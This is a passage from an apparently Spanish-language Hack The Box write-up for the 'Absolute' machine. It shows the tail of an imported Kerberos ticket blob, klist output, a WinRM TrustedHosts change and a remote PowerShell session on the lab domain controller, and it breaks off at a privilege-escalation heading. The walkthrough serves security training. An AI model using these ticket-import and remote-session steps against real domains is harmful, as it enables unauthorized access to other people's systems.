      ac7QoNM83sdtMyfBvTBfK7cUNtTi9hXpuEfCvgEIdThy8cE24USBCLKKaUdh+xUUkLpZObfwN5BHigIf
      FdGs53hond+nxlt9Fl6Q9bcYHo8oEb6tHdKonVaPiHQ5FhmO5cq2bfjaCnFxyZoyO1rK6wZMs4pMa545
      OlDF461JpHff9jpoE3i++C5BLhkVk/yJAUKR9ZpttLPLYHDaFWwTobcg87BkMzY+6K7UuyvFcMq5EUNa
      mbJ43tqfYynSKny3//SmuoNp90inCF7EBe20BH2GV2d0suRHKsXcpjn7vHvIfF0MaKbRJ1B5d3U0uO8/
      BPG85Y9hzKVAsNHUuPVuYDUzwsSe6DyO68nXm/RijCLj0xVpC2Hk1EHUdgn4uBTS2z5mKJI/LFAnKvVI
      7JkTck0K998mcxODdxyfuDYBVqt8V4A3oUlOwkANtlm7g26Y4/3xB/nADpkmWat7VtRqxJMHue+ADKUB
      9DkW6Dw/3Rsfj5hEo+IcpaXkZCkBcETlp+FHwbooSDviK6rWoBZNC6dJsegFY6DV4cTANlXkQERB8yV0
      mntjlApnhfRUtVn1IJlfKZi+WbEhXKZmo4xwsdLNqejxOyf+lZx585CgJSYKcItv5ol9pgV4QZA8f68q
      XlzwBD208K6Ti+2WLGvkQLGT6QMm2Lhqq6gYleCBBrtXMN3CJsDf574CaelotUV7tZko5NB7kqBvTRJs
      KL5KZaU7k7F+Qw0mxOrV4mtz8l6MVd82Xg1K8rMwxE1D23FVcj3K+mUwYXIAyL3M8WpA0esWzD7210AQ
      wM627KmgjnsNdukAhijG7TV/Q3LuzqVrqktpBprD7YMxMapEYdXlpxBhWo25xZL2U7X8Ukx74GRzMtpn
      VBFQXlEkJwyz3kuaeaGPKYdvkKVXeQeWcS5SD1B0xR4j6iYB5btBcEDmfMln4cE9PqJ7vIktWg51DITI
      NytzQr7bd9QjzIYol3WW0HcSe4QqNGDp0JMObkOtm02KS/A6zUnJTKecqaw3HB+pJQWu1Wo0nUpbv0Ag
      a8C3yL5a595ok9val3VnJQwEMeX3yLLIsCg7B4HCQwNBbLnCZGfF9Ux+2d0vH6wa7624W3dbKlyUjj1G
      vKpBSdKYLvFp9RYh4CZOHOfThXpTetUSK5fWJnTtdrO/qqIvgXvClNQEA4V7CjjuZrCS2kKeUTLoKMhz
      mDZP7I+GNUlcX5JVHvZKy4h63LKNNqXPGGAnEQoyjxqWIGkmQk+saEOOinEYzQcQE/Q0NqE+NrI7cKoh
      Kzch4Ba6yr55H6EWDR7byw3SeXvuetMbf+1JQOkiYWa2BN4DtvfL037wy+6stLE/NUNGim0icTHxKxps
      apjjbK3c/sYW5yfJs8W+l5s0I1151mQpEU+PhqfAM3qDEVK6edM8kx41t6OB6DCB5aADAgEAooHdBIHa
      fYHXMIHUoIHRMIHOMIHLoCswKaADAgESoSIEIOqW3T+Us9Y0Pp7K6Ypn1U6b3c6F5donFQx4gyQ/Us6P
      oQ4bDEFCU09MVVRFLkhUQqIXMBWgAwIBAaEOMAwbCndpbnJtX3VzZXKjBwMFAADhAAClERgPMjAyMzEx
      MDYxOTMzMTNaphEYDzIwMjMxMTA2MjI1NzU5WqcRGA8yMDIzMTEwNjIyNTc1OVqoDhsMQUJTT0xVVEUu
      SFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxBQlNPTFVURS5IVEI=
[+] Ticket successfully imported!
```


```
PS C:\Users\Alex\Desktop\HTB\Absolute> klist

El id. de inicio de sesión actual es 0:0xb74b2

Vales almacenados en caché: (1)

#0>     Cliente: winrm_user @ ABSOLUTE.HTB
        Servidor: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xe10000 -> renewable initial pre_authent name_canonicalize
        Hora de inicio: 11/6/2023 20:33:13 (local)
        Hora de finalización:   11/6/2023 23:57:59 (local)
        Hora de renovación: 11/6/2023 23:57:59 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0x1 -> PRIMARY
        KDC llamado:
```

```
PS C:\Users\Alex\desktop\HTB\Absolute> Enter-PSSession -ComputerName dc.absolute.htb
Enter-PSSession : Error de conexión al servidor remoto dc.absolute.htb. Mensaje de error: El cliente WinRM no puede
procesar la solicitud. Si el esquema de autenticación es distinto de Kerberos o si el equipo cliente no está unido a
lista TrustedHosts. Para obtener más información, ejecute el siguiente comando: winrm help config. Para obtener más
información, consulte el tema de la Ayuda about_Remote_Troubleshooting.
En línea: 1 Carácter: 1
+ Enter-PSSession -ComputerName dc.absolute.htb
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (dc.absolute.htb:String) [Enter-PSSession], PSRemotingTransportExceptio
   n
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
```


```
PS C:\Users\Alex\desktop\HTB\Absolute> winrm set winrm/config/client '@{TrustedHosts="dc.absolute.htb"}'
Client
    NetworkDelayms = 5000
    URLPrefix = wsman
    AllowUnencrypted = false
    Auth
        Basic = true
        Digest = true
        Kerberos = true
        Negotiate = true
        Certificate = true
        CredSSP = false
    DefaultPorts
        HTTP = 5985
        HTTPS = 5986
    TrustedHosts = dc.absolute.htb
```

```
[dc.absolute.htb]: PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
[dc.absolute.htb]: PS C:\Users\winrm_user\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::19c
   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
   IPv4 Address. . . . . . . . . . . : 10.129.68.75
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                       10.129.0.1
[dc.absolute.htb]: PS C:\Users\winrm_user\Documents>
```

## Escalada de Privilegios

